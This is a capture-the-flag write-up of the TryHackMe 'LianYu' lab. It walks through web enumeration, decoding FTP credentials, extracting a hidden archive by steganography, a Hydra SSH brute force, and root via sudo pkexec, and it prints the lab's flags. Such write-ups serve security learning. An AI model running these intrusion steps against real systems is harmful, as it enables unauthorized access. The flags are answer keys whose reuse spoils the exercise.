# Recon

### Nmap

```
nmap -vvv -Pn -sC -sV -oN /opt/THM/LianYu/1-recon/nmap/nmap_init.md 10.10.207.39
```

```
PORT    STATE SERVICE REASON  VERSION
21/tcp  open  ftp     syn-ack vsftpd 3.0.2
22/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T+pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV+d35X8CTUM882eJX+t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k+fnkLzX74fONcAEqseZDOffn5bxS+nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv+hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A+HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg==
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww+oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd+70Rul+G7Ch0uzextmZh7756/VrqKn+rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z+EfuCAfvMe0hxtrbHlb+VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini+VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l+/xEkXPxZ
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2+e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf+QRtxvjnqRg=
|   256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn
80/tcp  open  http    syn-ack Apache httpd
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Purgatory
111/tcp open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          43257/udp   status
|   100024  1          45835/tcp6  status
|   100024  1          54997/udp6  status
|_  100024  1          55654/tcp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

### WEB

http://10.10.207.39/

```
gobuster dir -u http://10.10.207.39:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /opt/THM/LianYu/2-enum/web/gob_dir_2.3_med.md
```


```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/island               (Status: 301) [Size: 235] [--> http://10.10.207.39/island/]
/server-status        (Status: 403) [Size: 199]
```

http://10.10.207.39/island/

```
<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
```


```
gobuster dir -u http://10.10.207.39:80/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /opt/THM/LianYu/2-enum/web/gob_dir_2.3_med_island.md
```


```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/2100                 (Status: 301) [Size: 240] [--> http://10.10.207.39/island/2100/]
```


http://10.10.207.39/island/2100/


```
<!-- you can avail your .ticket here but how?   -->
```


```
gobuster dir -u http://10.10.207.39:80/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket -o /opt/THM/LianYu/2-enum/web/gob_files_dir23_island_2100.md
```

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
```

http://10.10.207.39/island/2100/green_arrow.ticket

```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

bas58 decoding
```
!#th3h00d
```

ftp credentials
```
vigilante
!#th3h00d
```

ftp login successful

```
Connected to 10.10.207.39.
220 (vsFTPd 3.0.2)
Name (10.10.207.39:devel): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||59874|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> 
```


download all files on ftp server (need to escape the !)
```
wget -m --user="vigilante" --password="\!#th3h00d" ftp://10.10.207.39
```


```
FINISHED --2024-11-20 14:13:49--
Total wall clock time: 9.4s
Downloaded: 9 files, 1.2M in 4.8s (256 KB/s)

```


```
docker run --rm -it -v $(pwd):/steg rickdejager/stegseek aa.jpg ./rockyou.txt
```

```
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
```


```
file aa.jpg.out 
```

```
aa.jpg.out: Zip archive data, at least v2.0 to extract, compression method=deflate
```

```
unzip aa.jpg.out
```

```
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado 
```


passwd.txt

```
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

shado

```
M3tahuman
```

.other_user from the main ftp directory
```
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.
```

possible users
```
vigilante
joseph
adeline
wilson
slade
kane
jackal
```

# Privilege Escalation

### User


```
hydra -L ssh_users.md -p M3tahuman -e nsr -o /opt/THM/LianYu/2-enum/ftp/hydra_ssh.md ssh://10.10.207.39
```

```
[DATA] attacking ssh://10.10.207.39:22/
[22][ssh] host: 10.10.207.39   login: slade   password: M3tahuman
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-20 14:37:54
```

login to ssh now

```
slade
M3tahuman
```

```
slade@LianYu:~$ whoami
slade
slade@LianYu:~$ uname -a
Linux LianYu 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13) x86_64 GNU/Linux
```

/home/slade/user.txt

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak

```


### Root


```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

```
sudo /usr/bin/pkexec /bin/bash
```

```
root@LianYu:~# whoami
root
root@LianYu:~# sudo -l
Matching Defaults entries for root on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User root may run the following commands on LianYu:
    (ALL : ALL) ALL
root@LianYu:~# uname -a
Linux LianYu 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13) x86_64 GNU/Linux

```

```
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825


```